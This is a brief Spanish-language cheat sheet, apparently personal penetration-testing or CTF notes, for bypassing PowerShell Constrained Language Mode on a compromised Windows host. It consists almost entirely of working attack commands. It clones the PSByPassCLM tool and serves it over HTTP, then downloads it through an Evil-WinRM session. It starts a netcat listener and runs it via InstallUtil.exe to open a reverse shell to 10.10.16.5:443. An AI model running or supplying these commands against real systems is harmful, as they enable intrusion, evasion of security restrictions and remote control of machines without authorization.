
# BYPASS CLM LANGUAGE MODE
```shell
#DESCARGAR
❯ git clone https://github.com/padovah4ck/PSByPassCLM

#ACCEDER AL DIRECTORIO
./PSByPassCLM/PSBypassCLM/PSBypassCLM/bin/x64/Debug

#SUBIR A LA MÁQUINA
❯ sudo python3 -m http.server 80
*Evil-WinRM* PS C:\Windows\Temp\Recon> iwr -uri http://10.10.16.5/PsBypassCLM.exe -OutFile PsBypassCLM.exe
❯ sudo rlwrap nc -nlvp 443
*Evil-WinRM* PS C:\Windows\Temp\Recon> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.16.5 /rport=443 /U c:\Windows\Temp\Recon\PsBypassCLM.exe
PS C:\Windows\Temp\Recon>
```